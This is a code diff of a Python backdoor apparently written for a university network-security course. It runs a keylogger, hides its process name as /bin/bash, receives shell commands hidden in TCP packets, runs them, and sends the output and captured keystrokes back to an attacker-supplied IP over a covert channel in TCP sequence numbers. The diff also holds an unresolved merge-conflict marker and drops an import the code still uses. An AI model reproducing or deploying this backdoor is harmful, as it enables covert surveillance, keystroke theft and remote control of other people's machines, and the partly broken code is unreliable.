@@ -2,134 +2,83 @@
 
 import optparse
 import os
-import subprocess
 import sys
+<<<<<<< HEAD
+=======
 import time
+>>>>>>> 65cee74de58f2622c2b31996762e51a1d4c91a2e
+from packetutil import *
 from bkutil import *
 from multiprocessing import Process
-from cryptoutil import encrypt, decrypt
+from cryptoutil import *
 from scapy.all import *
 from file_monitoring import *
-from portknocking import *
 import _thread
 import setproctitle
+import argparse
+import pyxhook
+from linuxKey import OnKeyPress
 
-"""
-Setup: 
-dnf install python3-pip
-pip3 install pycrypto setproctitle scapy
-pip3 install watchdog3
-pip3 install python-xlib
-"""
+# parse command line argument
+arg_parser = argparse.ArgumentParser( 
+    prog='Backdoor',
+    description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
+)
+arg_parser.add_argument('-p', dest='port', type = int, help = 'attackers PORT', default=9999, const=9999, nargs='?')
+arg_parser.add_argument('-i', dest='ip', type = str, help = 'attackers IP', required=True)
+args = arg_parser.parse_args()
 
+#Global vars
 TTL = 234
 TTLKEY = 222
-victim = ("192.168.0.2", 9999)
+attacker = (args.ip, args.port)
 messages = []
-setFlag = "E"
-
-myip = ("192.168.0.3", 66)
 
 
-def secret_send(msg: str, type: str):
+def secret_send(msg: str, type: str,filename: str="file"):
+    """ Sends a file or plain text to attacker device
+    
+    Arguments:
+        msg {str} -- payload being sent
+        type {str} -- specifies if content sent is file or command
+        filename {str} -- name of file being sent (default:file)
     """
-    Keyword arguments:
-    msg      - payload being sent
-    type     - file or command
-    """
+
+    msg = message_to_bits(msg)
+    chunks = message_spliter(msg)
+    packets = packatizer(chunks,TTL,attacker)
+    send(packets, verbose=True)
+
     if(type == "command"):
-        # Convert message to ASCII to bits
-        msg = message_to_bits(msg)
-        chunks = message_spliter(msg)
-        packets = packatizer(chunks)
-        send(packets, verbose=True)
-        send(IP(dst=victim[0], ttl=TTL) /
-                       TCP(sport=myip[1], dport=victim[1], flags="U"))
+        send(IP(dst=attacker[0], ttl=TTL)/TCP(dport=attacker[1], flags="U"))
     elif(type == "file"):
-        msg = message_to_bits(msg)
-        chunks = message_spliter(msg)
-        packets = packatizer(chunks)
-        send(packets, verbose=True)
-        send(IP(dst=victim[0], ttl=TTL) /
-                       TCP(sport=myip[1], dport=victim[1], flags="P"))
-
-
-def packatizer(msg):
-    """[summary]
-
-    Arguments:
-        msg {[type]} -- [description]
-
-    Returns:
-        [type] -- [description]
-    """
-
-    # Create the packets array as a placeholder.
-    packets = []
-    # If the length of the number is larger than what is allowed in one packet, split it
-    counter = 0
-
-    # If not an array (if there is only one packet.)
-    if(type(msg) is str):
-        # The transmissions position and total will be 1.
-        # i.e. 1/1 message to send.
-        packets.append(craft(msg))
-    # If an array (if there is more than one packet)
-    elif(type(msg) is list):
-        while (counter < len(msg)):
-            # The position will be the array element and the total will be the
-            # length.
-            # i.e. 1/3 messages to send.
-            packets.append(craft(msg[counter]))
-            counter = counter + 1
-    return packets
-
-
-def craft(data: str) -> IP:
-    """[summary]
-
-    Arguments:
-        data {str} -- [description]
-
-    Returns:
-        IP -- [description]
-    """
-
-    global TTL
-    global setFlag
-    # The payload contains the unique password, UID, position number and total.
-    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],seq=int(str(data), 2), flags=setFlag)
-    return packet
+        send(IP(dst=attacker[0], ttl=TTL)/TCP(dport=attacker[1], flags="P")/Raw(load=encrypt(filename)))
 
 
 def execPayload(command):
-    """[summary]
+    """executes a command in shell and returns the results
 
     Arguments:
-        command {str} -- [description]
+        command {str} -- A string, or a sequence of program arguments
     """
 
     # Execute the command
     proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    result = proc.stdout.read() + proc.stderr.read()
-    payload = str(result)
-    print(payload)
-    secret_send(payload,"command")
-
-def getLogFile():
-    file = open('/root/Documents/file.log','r')
-    f = file.read()
-    #print(f)
-    secret_send(f,"file")
-    file.close()
-    return
+    result = str(proc.stdout.read() + proc.stderr.read())
+    if(result == ""):
+        result = "N/A"
+    #print(result) DEBUG
+    secret_send(result,"command")        
 
 def commandResult(packet):
-    """[summary]
-
+    """Extracts data from parsed packets
+    Packets with flag:
+        0x40 - specifys that the packet contains data inside the sequence number
+        0x20 - specify end of message and the data is sent for shell execution
+        0x08 - specifys a keylog file request 
     Arguments:
-        packet {scapy.packet} -- [description]
+        packet {scapy.packet} -- packet to be parsed
     """
 
     global TTLKEY
@@ -138,10 +87,8 @@ def commandResult(packet):
     if(packet.haslayer(IP) and ttl == TTLKEY):
         # checks if the flag has been set to know it contains the secret results
         flag = packet['TCP'].flags
-        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
         if flag == 0x40:
             field = packet[TCP].seq
-            # Converts the bits to the nearest divisible by 8
             covertContent = lengthChecker(field)
             messages.append(text_from_bits(covertContent))
         # End Flag detected
@@ -150,34 +97,36 @@ def commandResult(packet):
             execPayload(payload)
             messages = []
         elif flag == 0x08:
-            getLogFile()
-            #print("Server wants key log file!")
+            with open('/root/Documents/file.log','r') as f:
+                secret_send(f.read(),"file","file.log")
 
 
 
 def commandSniffer():
-    sniff(filter="tcp and host "+victim[0], prn=commandResult)
+    """filters incoming packets by type and sender. If packets match
+    given criteria it is parsed for content
+    """
+
+    sniff(filter="tcp and host "+attacker[0], prn=commandResult)
 
 
 setproctitle.setproctitle("/bin/bash")  # set fake process name
 
 sniffThread = threading.Thread(target=commandSniffer)
-fileMonitor = Monitor()
+fileMonitor = Monitor(addr=attacker) 
 
-#instantiate HookManager class
+#event listner for keyboard press down
 new_hook=pyxhook.HookManager()
-#listen to all keystrokes
 new_hook.KeyDown=OnKeyPress
-#hook the keyboard
 new_hook.HookKeyboard()
 
+new_hook.daemon = True
 fileMonitor.daemon = True
 sniffThread.daemon = True
-new_hook.daemon = True
 
+new_hook.start()
 sniffThread.start()
 fileMonitor.start()
-new_hook.start()
 
 while True:
     try:
